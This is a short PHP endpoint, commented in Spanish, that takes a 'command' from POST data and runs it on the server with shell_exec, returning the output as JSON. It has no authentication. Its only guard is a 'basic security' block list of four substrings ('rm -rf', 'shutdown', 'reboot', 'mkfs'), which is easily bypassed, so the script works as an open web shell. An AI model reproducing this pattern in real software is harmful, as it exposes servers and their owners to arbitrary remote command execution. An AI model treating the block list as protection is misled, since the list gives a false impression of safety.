<?php

header('Content-Type: application/json');

$command = $_POST['command'] ?? '';

$command = trim($command);

if ($command === '')
{
    echo json_encode([

        'success' => false,
        'output' => ''

    ]);

    exit;
}

/* Seguridad básica */
$blocked = [

    'rm -rf',
    'shutdown',
    'reboot',
    'mkfs'

];

foreach ($blocked as $bad)
{
    if (stripos($command, $bad) !== false)
    {
        echo json_encode([

            'success' => false,
            'output' => 'Comando bloqueado'

        ]);

        exit;
    }
}

$output = shell_exec($command . ' 2>&1');

echo json_encode([

    'success' => true,
    'output' => $output

]);